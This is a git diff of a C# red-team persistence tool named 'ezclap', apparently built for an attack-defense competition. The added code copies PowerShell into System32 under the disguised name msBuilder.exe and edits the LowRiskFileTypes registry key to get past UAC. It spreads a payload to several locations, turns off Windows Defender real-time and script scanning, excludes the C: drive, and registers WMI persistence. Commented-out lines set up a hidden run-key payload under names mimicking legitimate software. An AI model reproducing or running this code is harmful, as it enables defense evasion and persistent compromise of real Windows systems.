@@ -1,9 +1,8 @@
 ﻿using System;
-using System.Data;
-using System.DirectoryServices;
+using System.Configuration;
+using System.Collections.Specialized;
 using System.Collections.Generic;
 using Microsoft.Win32;
-using Microsoft.Win32.TaskScheduler;
 
 /*
  *  TODO: Implement yaml configuration parser 
@@ -51,10 +50,96 @@ namespace ezclap
             */
         }
 
+        public static void setup(string originPayloadLoc, string[] newLoc)
+        {
+            // 1. Copy powershell as msBuilder.exe 
+            string srcPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+            string destPath = @"C:\Windows\System32\msBuilder.exe";
+            System.IO.File.Copy(srcPath, destPath, true);
+
+            // 2. change LowRiskFileTypes to bypass UAC 
+            Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
+            //Console.WriteLine(RegistryKeys.hklmImagePath);
+
+            // 3. Copy payload into different locations 
+            List<string> payloadList = new List<string>();
+            foreach (var destination in newLoc)
+            {
+                System.IO.File.Copy(originPayloadLoc, destination, true);
+                payloadList.Add(destination);
+            }
+
+            // 4. Disable WinDefender
+            string noRealTime = "Set-MpPreference -DisableRealTimeMonitoring $true -DisableScriptScanning $true -DisableIOAVProtection $true";
+            string excludeC = "Add-MpPreference -ExclusionPath \"C:\"";
+            
+            System.Diagnostics.Process.Start(@"powershell.exe", noRealTime);
+            System.Diagnostics.Process.Start(@"powershell.exe", excludeC);
+
+           
+        }
+
+        private static void testConfig()
+        {
+            string[] WMIName = Utils.parseConfig("techniques/AddWMI", "name");
+            Array.ForEach(WMIName, Console.WriteLine);
+
+            string[] addUserPassword = Utils.parseConfig("techniques/AddUser", "password");
+            Array.ForEach(addUserPassword, Console.WriteLine);
+
+            string[] addUserGroups = Utils.parseConfig("techniques/AddUser", "groups");
+            Array.ForEach(addUserGroups, Console.WriteLine);
+
+            string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name");
+            Array.ForEach(scheduledTaskName, Console.WriteLine);
+        }
+
         static void Main(string[] args)
         {
+            // Copy powershell to different name and use it as a payload 
+
+            testConfig();
+            
+            Random rnd = new Random();
+
+            string originalPayloadLoc = args[0];
+            Console.WriteLine("[+] Using original payload: " + originalPayloadLoc);
+
+            string[] payload = Utils.parseConfig("payload", "name");
+            setup(originalPayloadLoc, payload);
+
+            Console.WriteLine("[+] \n\nNew Payload locations\n ");
+            Array.ForEach(payload, element => Console.WriteLine(element));
 
 
+
+            // ########## Getting Configuration Strings #####################
+
+            string[] WMIName = Utils.parseConfig("techniques/AddWMI", "name");
+            Array.ForEach(WMIName, element => Console.WriteLine(element));
+            AddWMI persistWMI = new AddWMI(WMIName, payload);
+
+            Console.ReadLine();
+
+            /*
+            // 1. Setup 
+            string[] payloadArray = setup(payload);
+            Random rand = new Random();
+
+            string runKeyPayload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c C:\\Users\\Administrator\\Desktop\\agent.exe";
+            string[] names = new string[] { "Application_Security", "Backup", "Appsec", "Google Updates", "Microsoft_Credential_Guard", "duderino", "catchmeifyoucan" };
+            AddRunKey persistRunKey = new AddRunKey(names, runKeyPayload);
+            */
+
+            /*
+            foreach(var key in addUserConfig.AllKeys)
+            {
+                Console.WriteLine(key + " = " + addUserConfig[key]);
+            }
+            Console.WriteLine(payload);
+            */
+
+            /*
             //string[] domainAdmins = new string[] { "joe", "bob", "michael", "whiteteamer", "blackteamer", "scoringengine" };
             //string[] randomUsers = new string[] { "father", "son", "cattails", "watershell", "headshot", "detcord", "silenttrinity" };
             // =================================================================================================================
@@ -68,9 +153,9 @@ namespace ezclap
              *  0. Setup 
              *      A) LowRiskFileTypes --> bypass bat, exe, ps1 
              *      B) Turn off windows defender completely --> Ask blackteam/redteam about if this is even needed 
-             *      C) Enable PSremoting, Winrm (?) 
+             *      C) Enable winrm, Enable PSremoting, 
              *      D) Drop all firewall rules 
-             */
+             
 
             
             Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
@@ -125,6 +210,7 @@ namespace ezclap
             
 
             Console.ReadLine();
+            */
         }
     }
 }
